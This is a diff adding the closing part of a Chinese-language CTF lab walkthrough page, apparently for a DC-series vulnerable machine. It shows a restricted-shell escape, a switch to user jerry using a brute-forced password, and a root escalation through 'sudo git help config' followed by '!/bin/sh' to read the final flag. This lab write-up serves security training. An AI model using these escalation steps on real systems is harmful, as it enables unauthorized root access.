+</h2><p>切换到jerry用户下面</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">exit</span>
+</span></span><span class="line"><span class="cl"><span class="n">BASH_CMDS</span><span class="p">[</span><span class="n">su</span><span class="p">]</span><span class="o">=/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span>
+</span></span><span class="line"><span class="cl"><span class="n">su</span>
+</span></span><span class="line"><span class="cl"><span class="n">xport</span> <span class="n">PATH</span><span class="o">=$</span><span class="n">PATH</span><span class="p">:</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl"><span class="k">export</span> <span class="n">PATH</span><span class="o">=$</span><span class="n">PATH</span><span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span>
+</span></span><span class="line"><span class="cl"><span class="n">su</span> <span class="n">jerry</span>
+</span></span><span class="line"><span class="cl"><span class="err">输入</span><span class="n">jerry的密码</span><span class="err">，前面收集爆破到的密码</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="三提权">三、提权
+</h2><p>使用git提权即可</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo git help config
+</span></span><span class="line"><span class="cl">#这边直接输下面的命令，不用打：
+</span></span><span class="line"><span class="cl">!/bin/sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">su
+</span></span><span class="line"><span class="cl">cd /root
+</span></span><span class="line"><span class="cl">cat final-flag.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>flag5</p>
+<blockquote>
+<p>Congratulatons!!!
+A special thanks to all those who sent me tweets
+and provided me with feedback - it&rsquo;s all greatly
+appreciated.
+If you enjoyed this CTF, send me a tweet via @DCAU7.</p>
+</blockquote>
+<h1 id="总结">总结：
+</h1><p>希望对大家有帮助</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/test1-chinese/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">DC-1</h2>
+        </div>
+    </a>
+</article>
+
+            
+        </div>
+    </div>
+</aside>
+
+     
+    
+        
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2024 鼎新实验室
+    </section>
+    
+    <section class="powerby">
+        
+            阜职网安小组 <br/>
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.29.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+
+    </body>
+</html>
